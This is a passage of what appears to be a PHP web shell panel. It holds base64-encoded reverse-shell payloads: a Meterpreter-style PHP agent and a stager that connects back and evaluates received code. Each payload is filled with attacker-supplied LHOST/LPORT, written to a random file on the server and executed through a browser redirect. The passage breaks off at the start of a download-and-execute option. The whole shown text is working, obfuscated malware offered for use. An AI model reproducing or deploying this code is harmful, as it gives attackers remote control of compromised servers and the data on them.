S04KTsgfSBlbHNlIHsgbXlfcHJpbnQoIld0ZiB0eXBlIGlzIHRoaXM/ICR0eXBlIik7ICR0bHYgPSBudWxsOyB9IHJldHVybiAkdGx2OyB9IGZ1bmN0aW9uIHBhY2tldF9hZGRfdGx2KCYkcGt0LCAkdGx2KSB7ICRwa3QgLj0gdGx2X3BhY2soJHRsdik7IH0gZnVuY3Rpb24gcGFja2V0X2dldF90bHYoJHBrdCwgJHR5cGUpIHsgJG9mZnNldCA9IDg7IHdoaWxlICgkb2Zmc2V0IDwgc3RybGVuKCRwa3QpKSB7ICR0bHYgPSB0bHZfdW5wYWNrKHN1YnN0cigkcGt0LCAkb2Zmc2V0KSk7IGlmICgkdHlwZSA9PSAoJHRsdlsndHlwZSddICYgflRMVl9NRVRBX1RZUEVfQ09NUFJFU1NFRCkpIHsgcmV0dXJuICR0bHY7IH0gJG9mZnNldCArPSAkdGx2WydsZW4nXTsgfSByZXR1cm4gbnVsbDsgfSBmdW5jdGlvbiBwYWNrZXRfZ2V0X2FsbF90bHZzKCRwa3QsICR0eXBlKSB7IG15X3ByaW50KCJMb29raW5nIGZvciBhbGwgdGx2cyBvZiB0eXBlICR0eXBlIik7ICRvZmZzZXQgPSA4OyAkYWxsID0gYXJyYXkoKTsgd2hpbGUgKCRvZmZzZXQgPCBzdHJsZW4oJHBrdCkpIHsgJHRsdiA9IHRsdl91bnBhY2soc3Vic3RyKCRwa3QsICRvZmZzZXQpKTsgaWYgKCR0bHYgPT0gTlVMTCkgeyBicmVhazsgfSBteV9wcmludCgibGVuOiB7JHRsdlsnbGVuJ119LCB0eXBlOiB7JHRsdlsndHlwZSddfSIpOyBpZiAoZW1wdHkoJHR5cGUpIHx8ICR0eXBlID09ICgkdGx2Wyd0eXBlJ10gJiB+VExWX01FVEFfVFlQRV9DT01QUkVTU0VEKSkgeyBteV9wcmludCgiRm91bmQgb25lIGF0IG9mZnNldCAkb2Zmc2V0Iik7IGFycmF5X3B1c2goJGFsbCwgJHRsdik7IH0gJG9mZnNldCArPSAkdGx2WydsZW4nXTsgfSByZXR1cm4gJGFsbDsgfSBmdW5jdGlvbiByZWdpc3Rlcl9zb2NrZXQoJHNvY2ssICRpcGFkZHI9bnVsbCwgJHBvcnQ9bnVsbCkgeyBnbG9iYWwgJHJlc291cmNlX3R5cGVfbWFwLCAkdWRwX2hvc3RfbWFwOyBteV9wcmludCgiUmVnaXN0ZXJpbmcgc29ja2V0ICRzb2NrIGZvciAoJGlwYWRkcjokcG9ydCkiKTsgJHJlc291cmNlX3R5cGVfbWFwWyhpbnQpJHNvY2tdID0gJ3NvY2tldCc7IGlmICgkaXBhZGRyKSB7ICR1ZHBfaG9zdF9tYXBbKGludCkkc29ja10gPSBhcnJheSgkaXBhZGRyLCAkcG9ydCk7IH0gfSBmdW5jdGlvbiByZWdpc3Rlcl9zdHJlYW0oJHN0cmVhbSwgJGlwYWRkcj1udWxsLCAkcG9ydD1udWxsKSB7IGdsb2JhbCAkcmVzb3VyY2VfdHlwZV9tYXAsICR1ZHBfaG9zdF9tYXA7IG15X3ByaW50KCJSZWdpc3RlcmluZyBzdHJlYW0gJHN0cmVhbSBmb3IgKCRpcGFkZHI6JHBvcnQpIik7ICRyZXNvdXJjZV90eXBlX21hcFsoaW50KSRzdHJlYW1dID0gJ3N0cmVhbSc7IGlmICgkaXBhZGRyKSB7ICR1ZHBfaG9zdF9tYXBbKGludCkkc3RyZWFtXSA9IGFycmF5KCRpcGFkZHIsICRwb3J0KTsgfSB9IGZ1bmN0aW9uIGNvbm5lY3QoJGlwYWRkciwgJHBvcnQsICRwcm90bz0ndGNwJykgeyBteV9wcmludCgiRG9pbmcgY29ubmVjdCgkaXBhZGRyLCAkcG9ydCkiKTsgJHNvY2sgPSBmYWxzZTsgJGlwZiA9IEFGX0lORVQ7ICRyYXdfaXAgPSAkaXBhZGRyOyBpZiAoRkFMU0UgIT09IHN0cnBvcygkaXBhZGRyLCAiOiIpKSB7ICRpcGYgPSBBRl9JTkVUNjsgJGlwYWRkciA9ICJbIi4gJHJhd19pcCAuIl0iOyB9IGlmIChpc19jYWxsYWJsZSgnc3RyZWFtX3NvY2tldF9jbGllbnQnKSkgeyBteV9wcmludCgic3RyZWFtX3NvY2tldF9jbGllbnQoeyRwcm90b306Ly97JGlwYWRkcn06eyRwb3J0fSkiKTsgJHNvY2sgPSBzdHJlYW1fc29ja2V0X2NsaWVudCgieyRwcm90b306Ly97JGlwYWRkcn06eyRwb3J0fSIpOyBteV9wcmludCgiR290IGEgc29jazogJHNvY2siKTsgaWYgKCEkc29jaykgeyByZXR1cm4gZmFsc2U7IH0gaWYgKCRwcm90byA9PSAndGNwJykgeyByZWdpc3Rlcl9zdHJlYW0oJHNvY2spOyB9IGVsc2VpZiAoJHByb3RvID09ICd1ZHAnKSB7IHJlZ2lzdGVyX3N0cmVhbSgkc29jaywgJGlwYWRkciwgJHBvcnQpOyB9IGVsc2UgeyBteV9wcmludCgiV1RGIHByb3RvIGlzIHRoaXM6ICckcHJvdG8nIik7IH0gfSBlbHNlIGlmIChpc19jYWxsYWJsZSgnZnNvY2tvcGVuJykpIHsgbXlfcHJpbnQoImZzb2Nrb3BlbiIpOyBpZiAoJHByb3RvID09ICd0Y3AnKSB7ICRzb2NrID0gZnNvY2tvcGVuKCRpcGFkZHIsJHBvcnQpOyBpZiAoISRzb2NrKSB7IHJldHVybiBmYWxzZTsgfSBpZiAoaXNfY2FsbGFibGUoJ3NvY2tldF9zZXRfdGltZW91dCcpKSB7IHNvY2tldF9zZXRfdGltZW91dCgkc29jaywgMik7IH0gcmVnaXN0ZXJfc3RyZWFtKCRzb2NrKTsgfSBlbHNlIHsgJHNvY2sgPSBmc29ja29wZW4oJHByb3RvLiI6Ly8iLiRpcGFkZHIsJHBvcnQpOyBpZiAoISRzb2NrKSB7IHJldHVybiBmYWxzZTsgfSByZWdpc3Rlcl9zdHJlYW0oJHNvY2ssICRpcGFkZHIsICRwb3J0KTsgfSB9IGVsc2UgaWYgKGlzX2NhbGxhYmxlKCdzb2NrZXRfY3JlYXRlJykpIHsgbXlfcHJpbnQoInNvY2tldF9jcmVhdGUiKTsgaWYgKCRwcm90byA9PSAndGNwJykgeyAkc29jayA9IHNvY2tldF9jcmVhdGUoJGlwZiwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gc29ja2V0X2Nvbm5lY3QoJHNvY2ssICRyYXdfaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IHJldHVybiBmYWxzZTsgfSByZWdpc3Rlcl9zb2NrZXQoJHNvY2spOyB9IGVsc2VpZiAoJHByb3RvID09ICd1ZHAnKSB7ICRzb2NrID0gc29ja2V0X2NyZWF0ZSgkaXBmLCBTT0NLX0RHUkFNLCBTT0xfVURQKTsgcmVnaXN0ZXJfc29ja2V0KCRzb2NrLCAkcmF3X2lwLCAkcG9ydCk7IH0gfSByZXR1cm4gJHNvY2s7IH0gZnVuY3Rpb24gZW9mKCRyZXNvdXJjZSkgeyAkcmV0ID0gZmFsc2U7IHN3aXRjaCAoZ2V0X3J0eXBlKCRyZXNvdXJjZSkpIHsgY2FzZSAnc29ja2V0JzogYnJlYWs7IGNhc2UgJ3N0cmVhbSc6ICRyZXQgPSBmZW9mKCRyZXNvdXJjZSk7IGJyZWFrOyB9IHJldHVybiAkcmV0OyB9IGZ1bmN0aW9uIGNsb3NlKCRyZXNvdXJjZSkgeyBteV9wcmludCgiQ2xvc2luZyByZXNvdXJjZSAkcmVzb3VyY2UiKTsgZ2xvYmFsICRyZXNvdXJjZV90eXBlX21hcCwgJHVkcF9ob3N0X21hcDsgcmVtb3ZlX3JlYWRlcigkcmVzb3VyY2UpOyBzd2l0Y2ggKGdldF9ydHlwZSgkcmVzb3VyY2UpKSB7IGNhc2UgJ3NvY2tldCc6ICRyZXQgPSBzb2NrZXRfY2xvc2UoJHJlc291cmNlKTsgYnJlYWs7IGNhc2UgJ3N0cmVhbSc6ICRyZXQgPSBmY2xvc2UoJHJlc291cmNlKTsgYnJlYWs7IH0gaWYgKGFycmF5X2tleV9leGlzdHMoKGludCkkcmVzb3VyY2UsICRyZXNvdXJjZV90eXBlX21hcCkpIHsgdW5zZXQoJHJlc291cmNlX3R5cGVfbWFwWyhpbnQpJHJlc291cmNlXSk7IH0gaWYgKGFycmF5X2tleV9leGlzdHMoKGludCkkcmVzb3VyY2UsICR1ZHBfaG9zdF9tYXApKSB7IG15X3ByaW50KCJSZW1vdmluZyAkcmVzb3VyY2UgZnJvbSB1ZHBfaG9zdF9tYXAiKTsgdW5zZXQoJHVkcF9ob3N0X21hcFsoaW50KSRyZXNvdXJjZV0pOyB9IHJldHVybiAkcmV0OyB9IGZ1bmN0aW9uIHJlYWQoJHJlc291cmNlLCAkbGVuPW51bGwpIHsgZ2xvYmFsICR1ZHBfaG9zdF9tYXA7IGlmIChpc19udWxsKCRsZW4pKSB7ICRsZW4gPSA4MTkyOyB9ICRidWZmID0gJyc7IHN3aXRjaCAoZ2V0X3J0eXBlKCRyZXNvdXJjZSkpIHsgY2FzZSAnc29ja2V0JzogaWYgKGFycmF5X2tleV9leGlzdHMoKGludCkkcmVzb3VyY2UsICR1ZHBfaG9zdF9tYXApKSB7IG15X3ByaW50KCJSZWFkaW5nIFVEUCBzb2NrZXQiKTsgbGlzdCgkaG9zdCwkcG9ydCkgPSAkdWRwX2hvc3RfbWFwWyhpbnQpJHJlc291cmNlXTsgc29ja2V0X3JlY3Zmcm9tKCRyZXNvdXJjZSwgJGJ1ZmYsICRsZW4sIFBIUF9CSU5BUllfUkVBRCwgJGhvc3QsICRwb3J0KTsgfSBlbHNlIHsgbXlfcHJpbnQoIlJlYWRpbmcgVENQIHNvY2tldCIpOyAkYnVmZiAuPSBzb2NrZXRfcmVhZCgkcmVzb3VyY2UsICRsZW4sIFBIUF9CSU5BUllfUkVBRCk7IH0gYnJlYWs7IGNhc2UgJ3N0cmVhbSc6IGdsb2JhbCAkbXNnc29jazsgJHIgPSBBcnJheSgkcmVzb3VyY2UpOyBteV9wcmludCgiQ2FsbGluZyBzZWxlY3QgdG8gc2VlIGlmIHRoZXJlJ3MgZGF0YSBvbiAkcmVzb3VyY2UiKTsgd2hpbGUgKHRydWUpIHsgJHc9TlVMTDskZT1OVUxMOyR0PTA7ICRjbnQgPSBzdHJlYW1fc2VsZWN0KCRyLCAkdywgJGUsICR0KTsgaWYgKCRjbnQgPT09IDApIHsgYnJlYWs7IH0gaWYgKCRjbnQgPT09IGZhbHNlIG9yIGZlb2YoJHJlc291cmNlKSkgeyBteV9wcmludCgiQ2hlY2tpbmcgZm9yIGZhaWxlZCByZWFkLi4uIik7IGlmIChlbXB0eSgkYnVmZikpIHsgbXlfcHJpbnQoIi0tLS0gRU9GIE9OICRyZXNvdXJjZSAtLS0tIik7ICRidWZmID0gZmFsc2U7IH0gYnJlYWs7IH0gJG1kID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJHJlc291cmNlKTsgZHVtcF9hcnJheSgkbWQsICJNZXRhZGF0YSBmb3IgeyRyZXNvdXJjZX0iKTsgaWYgKCRtZFsndW5yZWFkX2J5dGVzJ10gPiAwKSB7ICRidWZmIC49IGZyZWFkKCRyZXNvdXJjZSwgJG1kWyd1bnJlYWRfYnl0ZXMnXSk7IGJyZWFrOyB9IGVsc2UgeyAkdG1wID0gZnJlYWQoJHJlc291cmNlLCAkbGVuKTsgJGJ1ZmYgLj0gJHRtcDsgaWYgKHN0cmxlbigkdG1wKSA8ICRsZW4pIHsgYnJlYWs7IH0gfSBpZiAoJHJlc291cmNlICE9ICRtc2dzb2NrKSB7IG15X3ByaW50KCJidWZmOiAnJGJ1ZmYnIik7IH0gJHIgPSBBcnJheSgkcmVzb3VyY2UpOyB9IG15X3ByaW50KHNwcmludGYoIkRvbmUgd2l0aCB0aGUgYmlnIHJlYWQgbG9vcCBvbiAkcmVzb3VyY2UsIGdvdCAlZCBieXRlcyIsIHN0cmxlbigkYnVmZikpKTsgYnJlYWs7IGRlZmF1bHQ6ICRjaWQgPSBnZXRfY2hhbm5lbF9pZF9mcm9tX3Jlc291cmNlKCRyZXNvdXJjZSk7ICRjID0gZ2V0X2NoYW5uZWxfYnlfaWQoJGNpZCk7IGlmICgkYyBhbmQgJGNbJ2RhdGEnXSkgeyAkYnVmZiA9IHN1YnN0cigkY1snZGF0YSddLCAwLCAkbGVuKTsgJGNbJ2RhdGEnXSA9IHN1YnN0cigkY1snZGF0YSddLCAkbGVuKTsgbXlfcHJpbnQoIkFoYSEgZ290IHNvbWUgbGVmdG92ZXJzIik7IH0gZWxzZSB7IG15X3ByaW50KCJXdGYgZG9uJ3Qga25vdyBob3cgdG8gcmVhZCBmcm9tIHJlc291cmNlICRyZXNvdXJjZSwgYzogJGMiKTsgaWYgKGlzX2FycmF5KCRjKSkgeyBkdW1wX2FycmF5KCRjKTsgfSBicmVhazsgfSB9IG15X3ByaW50KHNwcmludGYoIlJlYWQgJWQgYnl0ZXMiLCBzdHJsZW4oJGJ1ZmYpKSk7IHJldHVybiAkYnVmZjsgfSBmdW5jdGlvbiB3cml0ZSgkcmVzb3VyY2UsICRidWZmLCAkbGVuPTApIHsgZ2xvYmFsICR1ZHBfaG9zdF9tYXA7IGlmICgkbGVuID09IDApIHsgJGxlbiA9IHN0cmxlbigkYnVmZik7IH0gJGNvdW50ID0gZmFsc2U7IHN3aXRjaCAoZ2V0X3J0eXBlKCRyZXNvdXJjZSkpIHsgY2FzZSAnc29ja2V0JzogaWYgKGFycmF5X2tleV9leGlzdHMoKGludCkkcmVzb3VyY2UsICR1ZHBfaG9zdF9tYXApKSB7IG15X3ByaW50KCJXcml0aW5nIFVEUCBzb2NrZXQiKTsgbGlzdCgkaG9zdCwkcG9ydCkgPSAkdWRwX2hvc3RfbWFwWyhpbnQpJHJlc291cmNlXTsgJGNvdW50ID0gc29ja2V0X3NlbmR0bygkcmVzb3VyY2UsICRidWZmLCAkbGVuLCAkaG9zdCwgJHBvcnQpOyB9IGVsc2UgeyAkY291bnQgPSBzb2NrZXRfd3JpdGUoJHJlc291cmNlLCAkYnVmZiwgJGxlbik7IH0gYnJlYWs7IGNhc2UgJ3N0cmVhbSc6ICRjb3VudCA9IGZ3cml0ZSgkcmVzb3VyY2UsICRidWZmLCAkbGVuKTsgZmZsdXNoKCRyZXNvdXJjZSk7IGJyZWFrOyBkZWZhdWx0OiBteV9wcmludCgiV3RmIGRvbid0IGtub3cgaG93IHRvIHdyaXRlIHRvIHJlc291cmNlICRyZXNvdXJjZSIpOyBicmVhazsgfSByZXR1cm4gJGNvdW50OyB9IGZ1bmN0aW9uIGdldF9ydHlwZSgkcmVzb3VyY2UpIHsgZ2xvYmFsICRyZXNvdXJjZV90eXBlX21hcDsgaWYgKGFycmF5X2tleV9leGlzdHMoKGludCkkcmVzb3VyY2UsICRyZXNvdXJjZV90eXBlX21hcCkpIHsgcmV0dXJuICRyZXNvdXJjZV90eXBlX21hcFsoaW50KSRyZXNvdXJjZV07IH0gcmV0dXJuIGZhbHNlOyB9IGZ1bmN0aW9uIHNlbGVjdCgmJHIsICYkdywgJiRlLCAkdHZfc2VjPTAsICR0dl91c2VjPTApIHsgJHN0cmVhbXNfciA9IGFycmF5KCk7ICRzdHJlYW1zX3cgPSBhcnJheSgpOyAkc3RyZWFtc19lID0gYXJyYXkoKTsgJHNvY2tldHNfciA9IGFycmF5KCk7ICRzb2NrZXRzX3cgPSBhcnJheSgpOyAkc29ja2V0c19lID0gYXJyYXkoKTsgaWYgKCRyKSB7IGZvcmVhY2ggKCRyIGFzICRyZXNvdXJjZSkgeyBzd2l0Y2ggKGdldF9ydHlwZSgkcmVzb3VyY2UpKSB7IGNhc2UgJ3NvY2tldCc6ICRzb2NrZXRzX3JbXSA9ICRyZXNvdXJjZTsgYnJlYWs7IGNhc2UgJ3N0cmVhbSc6ICRzdHJlYW1zX3JbXSA9ICRyZXNvdXJjZTsgYnJlYWs7IGRlZmF1bHQ6IG15X3ByaW50KCJVbmtub3duIHJlc291cmNlIHR5cGUiKTsgYnJlYWs7IH0gfSB9IGlmICgkdykgeyBmb3JlYWNoICgkdyBhcyAkcmVzb3VyY2UpIHsgc3dpdGNoIChnZXRfcnR5cGUoJHJlc291cmNlKSkgeyBjYXNlICdzb2NrZXQnOiAkc29ja2V0c193W10gPSAkcmVzb3VyY2U7IGJyZWFrOyBjYXNlICdzdHJlYW0nOiAkc3RyZWFtc193W10gPSAkcmVzb3VyY2U7IGJyZWFrOyBkZWZhdWx0OiBteV9wcmludCgiVW5rbm93biByZXNvdXJjZSB0eXBlIik7IGJyZWFrOyB9IH0gfSBpZiAoJGUpIHsgZm9yZWFjaCAoJGUgYXMgJHJlc291cmNlKSB7IHN3aXRjaCAoZ2V0X3J0eXBlKCRyZXNvdXJjZSkpIHsgY2FzZSAnc29ja2V0JzogJHNvY2tldHNfZVtdID0gJHJlc291cmNlOyBicmVhazsgY2FzZSAnc3RyZWFtJzogJHN0cmVhbXNfZVtdID0gJHJlc291cmNlOyBicmVhazsgZGVmYXVsdDogbXlfcHJpbnQoIlVua25vd24gcmVzb3VyY2UgdHlwZSIpOyBicmVhazsgfSB9IH0gJG5fc29ja2V0cyA9IGNvdW50KCRzb2NrZXRzX3IpICsgY291bnQoJHNvY2tldHNfdykgKyBjb3VudCgkc29ja2V0c19lKTsgJG5fc3RyZWFtcyA9IGNvdW50KCRzdHJlYW1zX3IpICsgY291bnQoJHN0cmVhbXNfdykgKyBjb3VudCgkc3RyZWFtc19lKTsgJHIgPSBhcnJheSgpOyAkdyA9IGFycmF5KCk7ICRlID0gYXJyYXkoKTsgaWYgKGNvdW50KCRzb2NrZXRzX3IpPT0wKSB7ICRzb2NrZXRzX3IgPSBudWxsOyB9IGlmIChjb3VudCgkc29ja2V0c193KT09MCkgeyAkc29ja2V0c193ID0gbnVsbDsgfSBpZiAoY291bnQoJHNvY2tldHNfZSk9PTApIHsgJHNvY2tldHNfZSA9IG51bGw7IH0gaWYgKGNvdW50KCRzdHJlYW1zX3IpPT0wKSB7ICRzdHJlYW1zX3IgPSBudWxsOyB9IGlmIChjb3VudCgkc3RyZWFtc193KT09MCkgeyAkc3RyZWFtc193ID0gbnVsbDsgfSBpZiAoY291bnQoJHN0cmVhbXNfZSk9PTApIHsgJHN0cmVhbXNfZSA9IG51bGw7IH0gJGNvdW50ID0gMDsgaWYgKCRuX3NvY2tldHMgPiAwKSB7ICRyZXMgPSBzb2NrZXRfc2VsZWN0KCRzb2NrZXRzX3IsICRzb2NrZXRzX3csICRzb2NrZXRzX2UsICR0dl9zZWMsICR0dl91c2VjKTsgaWYgKGZhbHNlID09PSAkcmVzKSB7IHJldHVybiBmYWxzZTsgfSBpZiAoaXNfYXJyYXkoJHIpICYmIGlzX2FycmF5KCRzb2NrZXRzX3IpKSB7ICRyID0gYXJyYXlfbWVyZ2UoJHIsICRzb2NrZXRzX3IpOyB9IGlmIChpc19hcnJheSgkdykgJiYgaXNfYXJyYXkoJHNvY2tldHNfdykpIHsgJHcgPSBhcnJheV9tZXJnZSgkdywgJHNvY2tldHNfdyk7IH0gaWYgKGlzX2FycmF5KCRlKSAmJiBpc19hcnJheSgkc29ja2V0c19lKSkgeyAkZSA9IGFycmF5X21lcmdlKCRlLCAkc29ja2V0c19lKTsgfSAkY291bnQgKz0gJHJlczsgfSBpZiAoJG5fc3RyZWFtcyA+IDApIHsgJHJlcyA9IHN0cmVhbV9zZWxlY3QoJHN0cmVhbXNfciwgJHN0cmVhbXNfdywgJHN0cmVhbXNfZSwgJHR2X3NlYywgJHR2X3VzZWMpOyBpZiAoZmFsc2UgPT09ICRyZXMpIHsgcmV0dXJuIGZhbHNlOyB9IGlmIChpc19hcnJheSgkcikgJiYgaXNfYXJyYXkoJHN0cmVhbXNfcikpIHsgJHIgPSBhcnJheV9tZXJnZSgkciwgJHN0cmVhbXNfcik7IH0gaWYgKGlzX2FycmF5KCR3KSAmJiBpc19hcnJheSgkc3RyZWFtc193KSkgeyAkdyA9IGFycmF5X21lcmdlKCR3LCAkc3RyZWFtc193KTsgfSBpZiAoaXNfYXJyYXkoJGUpICYmIGlzX2FycmF5KCRzdHJlYW1zX2UpKSB7ICRlID0gYXJyYXlfbWVyZ2UoJGUsICRzdHJlYW1zX2UpOyB9ICRjb3VudCArPSAkcmVzOyB9IHJldHVybiAkY291bnQ7IH0gZnVuY3Rpb24gYWRkX3JlYWRlcigkcmVzb3VyY2UpIHsgZ2xvYmFsICRyZWFkZXJzOyBpZiAoaXNfcmVzb3VyY2UoJHJlc291cmNlKSAmJiAhaW5fYXJyYXkoJHJlc291cmNlLCAkcmVhZGVycykpIHsgJHJlYWRlcnNbXSA9ICRyZXNvdXJjZTsgfSB9IGZ1bmN0aW9uIHJlbW92ZV9yZWFkZXIoJHJlc291cmNlKSB7IGdsb2JhbCAkcmVhZGVyczsgaWYgKGluX2FycmF5KCRyZXNvdXJjZSwgJHJlYWRlcnMpKSB7IGZvcmVhY2ggKCRyZWFkZXJzIGFzICRrZXkgPT4gJHIpIHsgaWYgKCRyID09ICRyZXNvdXJjZSkgeyB1bnNldCgkcmVhZGVyc1ska2V5XSk7IH0gfSB9IH0gb2JfaW1wbGljaXRfZmx1c2goKTsgZXJyb3JfcmVwb3J0aW5nKDApOyBAaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7IEBzZXRfdGltZV9saW1pdCgwKTsgQGlnbm9yZV91c2VyX2Fib3J0KDEpOyBAaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywwKTsgJEdMT0JBTFNbJ1VVSUQnXSA9IFBBWUxPQURfVVVJRDsgaWYgKCFpc3NldCgkR0xPQkFMU1snbXNnc29jayddKSkgeyAkaXBhZGRyID0gJ3hsb25jYXRpcCc7ICRwb3J0ID0geGxvbmNhdHBvcnQ7IG15X3ByaW50KCJEb24ndCBoYXZlIGEgbXNnc29jaywgdHJ5aW5nIHRvIGNvbm5lY3QoJGlwYWRkciwgJHBvcnQpIik7ICRtc2dzb2NrID0gY29ubmVjdCgkaXBhZGRyLCAkcG9ydCk7IGlmICghJG1zZ3NvY2spIHsgZGllKCk7IH0gfSBlbHNlIHsgJG1zZ3NvY2sgPSAkR0xPQkFMU1snbXNnc29jayddOyAkbXNnc29ja190eXBlID0gJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddOyBzd2l0Y2ggKCRtc2dzb2NrX3R5cGUpIHsgY2FzZSAnc29ja2V0JzogcmVnaXN0ZXJfc29ja2V0KCRtc2dzb2NrKTsgYnJlYWs7IGNhc2UgJ3N0cmVhbSc6IGRlZmF1bHQ6IHJlZ2lzdGVyX3N0cmVhbSgkbXNnc29jayk7IH0gfSBhZGRfcmVhZGVyKCRtc2dzb2NrKTsgJHI9JEdMT0JBTFNbJ3JlYWRlcnMnXTsgJHc9TlVMTDskZT1OVUxMOyR0PTE7IHdoaWxlIChmYWxzZSAhPT0gKCRjbnQgPSBzZWxlY3QoJHIsICR3LCAkZSwgJHQpKSkgeyAkcmVhZF9mYWlsZWQgPSBmYWxzZTsgZm9yICgkaSA9IDA7ICRpIDwgJGNudDsgJGkrKykgeyAkcmVhZHkgPSAkclskaV07IGlmICgkcmVhZHkgPT0gJG1zZ3NvY2spIHsgJGhlYWRlciA9IHJlYWQoJG1zZ3NvY2ssIDEyKTsgaWYgKGZhbHNlPT0kaGVhZGVyKSB7IGJyZWFrIDI7IH0gJHhvciA9IHN0cnJldihzdWJzdHIoJGhlYWRlciwgMCwgNCkpOyAkcmVxdWVzdCA9IHN1YnN0cigkaGVhZGVyLCA0KTsgJGxlbl9hcnJheSA9IHVucGFjaygiTmxlbiIsIHhvcl9ieXRlcygkeG9yLCBzdWJzdHIoJHJlcXVlc3QsIDAsIDQpKSk7ICRsZW4gPSAkbGVuX2FycmF5WydsZW4nXTsgd2hpbGUgKHN0cmxlbigkcmVxdWVzdCkgPCAkbGVuKSB7ICRyZXF1ZXN0IC49IHJlYWQoJG1zZ3NvY2ssICRsZW4tc3RybGVuKCRyZXF1ZXN0KSk7IH0gJHJlc3BvbnNlID0gY3JlYXRlX3Jlc3BvbnNlKCR4b3IsICRyZXF1ZXN0KTsgd3JpdGVfdGx2X3RvX3NvY2tldCgkbXNnc29jaywgJHJlc3BvbnNlKTsgfSBlbHNlIHsgJGRhdGEgPSByZWFkKCRyZWFkeSk7IGlmIChmYWxzZSA9PT0gJGRhdGEpIHsgaGFuZGxlX2RlYWRfcmVzb3VyY2VfY2hhbm5lbCgkcmVhZHkpOyB9IGVsc2VpZiAoc3RybGVuKCRkYXRhKSA+IDApeyBteV9wcmludChzcHJpbnRmKCJSZWFkIHJldHVybmVkICVzIGJ5dGVzIiwgc3RybGVuKCRkYXRhKSkpOyAkcmVxdWVzdCA9IGhhbmRsZV9yZXNvdXJjZV9yZWFkX2NoYW5uZWwoJHJlYWR5LCAkZGF0YSk7IGlmICgkcmVxdWVzdCkgeyB3cml0ZV90bHZfdG9fc29ja2V0KCRtc2dzb2NrLCAkcmVxdWVzdCk7IH0gfSB9IH0gJHIgPSAkR0xPQkFMU1sncmVhZGVycyddOyB9IG15X3ByaW50KCJGaW5pc2hlZCIpOyBteV9wcmludCgiLS0tLS0tLS0tLS0tLS0tLS0tLS0iKTsgY2xvc2UoJG1zZ3NvY2spOwo=");
        $file = str_replace('xloncatip', $host, $file);
        $file = str_replace('xloncatport', $port, $file);
        $filename = PREFIX.mt_rand(1,1000).SUFFIX;
        if(file_put_contents($filename, $file)) {
            echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
        }
    }
  ?><form method="POST"><?php
  fv_inputtext("LHOST:", "r_lhost", "Type LHOST");
  fv_inputtext("LPORT:", "r_lport", "Type LPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
  }
  if($payload == "php/reverse_perl") {
    if(@checkvar($_POST['r_lport']) === TRUE) {
        $port = $_POST['r_lport'];
        $host = $_POST['r_lhost'];
        $file = d("Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJ3hsb25jYXRpcCc7ICRwb3J0ID0geGxvbmNhdHBvcnQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gZWxzZWlmICgoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBlbHNlIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgZXZhbCgkYik7IGRpZSgpOwo=");
        $file = str_replace('xloncatip', $host, $file);
        $file = str_replace('xloncatport', $port, $file);
        $filename = PREFIX.mt_rand(1,1000).SUFFIX;
        if(file_put_contents($filename, $file)) {
            echo "<script>alert('Created payload file at {$filename}'); alert('Payload is being executed'); window.location.href=\"{$filename}\"</script>";
        }
    }
  ?><form method="POST"><?php
  fv_inputtext("LHOST:", "r_lhost", "Type LHOST");
  fv_inputtext("LPORT:", "r_lport", "Type LPORT");
  c_inputhidden("payload", $payload);
  submitbutton("Execute");
  ?></form><?php
  }
  if($payload == "php/download_exec") {
    if(@checkvar($_POST['url']) === TRUE) {
        $url = $_POST['url'];
